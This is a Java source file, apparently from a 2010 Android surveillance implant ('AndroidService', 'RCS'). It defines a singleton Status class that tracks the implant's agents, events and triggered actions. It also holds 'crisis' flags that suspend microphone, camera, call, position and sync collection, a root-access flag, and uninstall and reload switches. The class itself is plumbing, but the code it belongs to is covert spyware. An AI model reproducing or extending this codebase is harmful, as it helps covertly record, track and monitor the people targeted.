/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service;

import java.util.ArrayList;
import java.util.HashMap;

import android.content.Context;

import com.android.service.action.Action;
import com.android.service.agent.AgentCrisis;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAgent;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.Globals;
import com.android.service.util.Check;

// Singleton Class
/**
 * The Class Status.
 */
public class Status {
	private static final String TAG = "Status"; //$NON-NLS-1$

	/** The agents map. */
	private final HashMap<String, ConfAgent> agentsMap;

	/** The events map. */
	private final HashMap<Integer, ConfEvent> eventsMap;

	/** The actions map. */
	private final HashMap<Integer, Action> actionsMap;

	Globals globals;

	/** The triggered actions. */
	ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];

	/** The synced. */
	public boolean synced;

	/** The drift. */
	public int drift;

	/** The context. */
	private static Context context;

	Object lockCrisis = new Object();
	private boolean crisis = false;
	private boolean[] crisisType = new boolean[AgentCrisis.SIZE];
	private boolean haveRoot;

	private final Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];

	public boolean uninstall;
	public boolean reload;

	/**
	 * Instantiates a new status.
	 */
	private Status() {
		agentsMap = new HashMap<String, ConfAgent>();
		eventsMap = new HashMap<Integer, ConfEvent>();
		actionsMap = new HashMap<Integer, Action>();
	}

	/** The singleton. */
	private volatile static Status singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static Status self() {
		if (singleton == null) {
			synchronized (Status.class) {
				if (singleton == null) {
					singleton = new Status();
				}
			}
		}

		return singleton;
	}

	/**
	 * Clean.
	 */
	public void clean() {
		agentsMap.clear();
		eventsMap.clear();
		actionsMap.clear();
		globals = null;
		uninstall = false;
		reload = false;
	}

	/**
	 * Gets the app context.
	 * 
	 * @return the app context
	 */
	public static Context getAppContext() {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}
		return context;
	}

	/**
	 * Sets the app context.
	 * 
	 * @param context
	 *            the new app context
	 */
	public static void setAppContext(final Context context) {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}
		Status.context = context;
	}

	// Add an agent to the map
	/**
	 * Adds the agent.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addAgent(final ConfAgent a) throws GeneralException {

		if (agentsMap.containsKey(a.getType()) == true) {
			// throw new RCSException("Agent " + a.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituing agent: " + a); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		final String key = a.getType();
		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		agentsMap.put(a.getType(), a);
	}

	// Add an event to the map
	/**
	 * Adds the event.
	 * 
	 * @param e
	 *            the e
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addEvent(final ConfEvent e) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " addEvent "); //$NON-NLS-1$
		}
		// Don't add the same event twice
		if (eventsMap.containsKey(e.getId()) == true) {
			// throw new RCSException("Event " + e.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituing event: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		eventsMap.put(e.getId(), e);
	}

	// Add an action to the map
	/**
	 * Adds the action.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addAction(final Action a) {
		// Don't add the same action twice
		if (Cfg.DEBUG) {
			Check.requires(!actionsMap.containsKey(a.getId()), "Action " + a.getId() + " already loaded"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		actionsMap.put(a.getId(), a);
	}

	public void setGlobal(Globals g) {
		this.globals = g;
	}

	/**
	 * Gets the actions number.
	 * 
	 * @return the actions number
	 */
	public int getActionsNumber() {
		return actionsMap.size();
	}

	/**
	 * Gets the agents number.
	 * 
	 * @return the agents number
	 */
	public int getAgentsNumber() {
		return agentsMap.size();
	}

	/**
	 * Gets the events number.
	 * 
	 * @return the events number
	 */
	public int getEventsNumber() {
		return eventsMap.size();
	}

	/**
	 * Gets the agents map.
	 * 
	 * @return the agents map
	 */
	public HashMap<String, ConfAgent> getAgentsMap() {
		return agentsMap;
	}

	/**
	 * Gets the events map.
	 * 
	 * @return the events map
	 */
	public HashMap<Integer, ConfEvent> getEventsMap() {
		return eventsMap;
	}

	/**
	 * Gets the actions map.
	 * 
	 * @return the actions map
	 */
	public HashMap<Integer, Action> getActionsMap() {
		return actionsMap;
	}

	/**
	 * Gets the action.
	 * 
	 * @param index
	 *            the index
	 * @return the action
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public Action getAction(final int index) throws GeneralException {
		if (actionsMap.containsKey(index) == false) {
			throw new GeneralException("Action " + index + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final Action a = actionsMap.get(index);

		if (a == null) {
			throw new GeneralException("Action " + index + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return a;
	}

	/**
	 * Gets the agent.
	 * 
	 * @param string
	 *            the id
	 * @return the agent
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public ConfAgent getAgent(final String string) throws GeneralException {
		if (agentsMap.containsKey(string) == false) {
			throw new GeneralException("Agent " + string + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final ConfAgent a = agentsMap.get(string);

		if (a == null) {
			throw new GeneralException("Agent " + string + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return a;
	}

	/**
	 * Gets the event.
	 * 
	 * @param id
	 *            the id
	 * @return the event
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public ConfEvent getEvent(final int id) throws GeneralException {
		if (eventsMap.containsKey(id) == false) {
			throw new GeneralException("Event " + id + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final ConfEvent e = eventsMap.get(id);

		if (e == null) {
			throw new GeneralException("Event " + id + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return e;
	}

	/**
	 * Gets the option.
	 * 
	 * @param id
	 *            the id
	 * @return the option
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public Globals getGlobals() {
		return globals;
	}

	/**
	 * Trigger action.
	 * 
	 * @param i
	 *            the i
	 */
	public void triggerAction(final int i) {
		Action action = actionsMap.get(new Integer(i));
		int qq=action.getQueue();
		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		synchronized (act) {
			if (!act.contains(i)) {
				act.add(new Integer(i));
			}
		}
		synchronized (tsem) {
			try {
				tsem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Gets the triggered actions.
	 * 
	 * @return the triggered actions
	 */
	public int[] getTriggeredActions(int qq) {
		if (Cfg.DEBUG)
			Check.asserts(qq > 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);

		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		if (Cfg.DEBUG)
			Check.asserts(tsem != null, "getTriggeredActions null tsem");

		try {
			synchronized (tsem) {
				tsem.wait();
			}
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + " getActionIdTriggered: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		synchronized (tsem) {
			final int size = act.size();
			final int[] triggered = new int[size];

			for (int i = 0; i < size; i++) {
				triggered[i] = act.get(i);
			}

			return triggered;
		}
	}

	/**
	 * Un trigger action.
	 * 
	 * @param action
	 *            the action
	 */
	public void unTriggerAction(final Action action) {
		int qq = action.getQueue();
		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
		Object sem = triggeredSemaphore[qq];

		synchronized (act) {
			if (act.contains(action.getId())) {
				act.remove(new Integer(action.getId()));
			}
		}
		synchronized (sem) {
			try {
				sem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Un trigger all.
	 */
	public void unTriggerAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unTriggerAll)"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		for (int qq = 0; qq < Action.NUM_QUEUE; qq++) {
			ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
			Object sem = triggeredSemaphore[qq];

			synchronized (act) {
				act.clear();
			}
			synchronized (sem) {
				try {
					sem.notifyAll();
				} catch (final Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(ex);//$NON-NLS-1$
					}
				}
			}
		}

	}

	public synchronized void setCrisis(int type, boolean value) {
		synchronized (lockCrisis) {
			crisisType[type] = value;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " setCrisis: " + type); //$NON-NLS-1$
		}

		ConfAgent agent;
		try {
			agent = getAgent("mic");
			if (agent != null) {
				// TODO: micAgent, crisis should stop recording
				// final AgentMic micAgent = (AgentMic) agent;
				// micAgent.crisis(crisisMic());
			}
		} catch (final GeneralException e) {
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

	}

	private boolean isCrisis() {
		synchronized (lockCrisis) {
			return crisis;
		}
	}

	public boolean crisisPosition() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[AgentCrisis.POSITION]);
		}
	}

	public boolean crisisCamera() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[AgentCrisis.CAMERA]);
		}
	}

	public boolean crisisCall() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[AgentCrisis.CALL]);
		}
	}

	public boolean crisisMic() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[AgentCrisis.MIC]);
		}
	}

	public boolean crisisSync() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[AgentCrisis.SYNC]);
		}
	}

	/**
	 * Start crisis.
	 */
	public void startCrisis() {
		synchronized (lockCrisis) {
			crisis = true;
		}
	}

	/**
	 * Stop crisis.
	 */
	public void stopCrisis() {
		synchronized (lockCrisis) {
			crisis = false;
		}
	}

	public boolean haveRoot() {
		return this.haveRoot;
	}

	public void setRoot(boolean r) {
		this.haveRoot = r;
	}

}
